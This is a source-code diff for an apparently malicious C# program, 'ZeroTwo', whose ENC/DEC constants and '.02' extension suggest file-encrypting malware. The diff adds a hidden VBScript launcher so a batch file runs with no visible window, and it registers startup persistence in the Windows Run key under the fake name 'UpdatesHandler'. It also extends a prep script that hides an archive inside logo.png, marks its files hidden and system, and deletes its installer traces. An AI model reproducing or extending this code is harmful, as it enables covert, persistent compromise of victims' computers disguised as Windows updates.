@@ -9,14 +9,15 @@ namespace ZeroTwo.src {
     class ZeroTwo {
         private const string EXT = ".02";
 
+        private const int ENC = 0;
+        private const int DEC = 1;
+
         private const string WORKDIR = "C:\\Updates";
+        private const string H_SCR_NAME = "h.vbs";
         private const string PREP_BAT_NAME = "Prep.bat";
         private const string EXEC_BAT_NAME = "Update.bat";
         private const string REG_KEY = "UpdatesHandler";
         private const string EXE_NAME = "WinUpdates";
-
-        private const int ENC = 0;
-        private const int DEC = 1;
 
         public static void Main(string[] args) {
 
@@ -35,7 +36,7 @@ namespace ZeroTwo.src {
 
         private static void InjectInReg() {
             RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
-            key.SetValue(REG_KEY, WORKDIR + "\\" + EXEC_BAT_NAME);
+            key.SetValue(REG_KEY, "wscript " + WORKDIR + "\\" + H_SCR_NAME + " " + WORKDIR + "\\" + EXEC_BAT_NAME);
             key.Close();
         }
 
@@ -56,6 +57,10 @@ namespace ZeroTwo.src {
                     sfile.CopyTo(file);
                 }
             }
+
+            string hScr = string.Empty;
+            hScr += "CreateObject(\"Wscript.Shell\").Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False";
+            File.WriteAllText(WORKDIR + "\\" + H_SCR_NAME, hScr);
 
             string execBat = string.Empty;
             execBat += "@ECHO OFF\n";
@@ -78,6 +83,7 @@ namespace ZeroTwo.src {
             prepBat += "copy /b logo.png + " + EXE_NAME + ".rar " + "logo.png" + "\n";
             prepBat += "echo j | attrib +h +s " + "\"" + "arc.exe" + "\"" + "\n";
             prepBat += "echo j | attrib +h +s " + "\"" + EXEC_BAT_NAME + "\"" + "\n";
+            prepBat += "echo j | attrib +h +s " + "\"" + H_SCR_NAME + "\"" + "\n";
             prepBat += "echo j | del /F /Q " + "\"" + EXE_NAME + ".exe" + "\"" + "\n";
             prepBat += "echo j | del /F /Q " + "\"" + EXE_NAME + ".rar" + "\"" + "\n";
             prepBat += "echo j | del /F /Q " + "\"" + PREP_BAT_NAME + "\"";
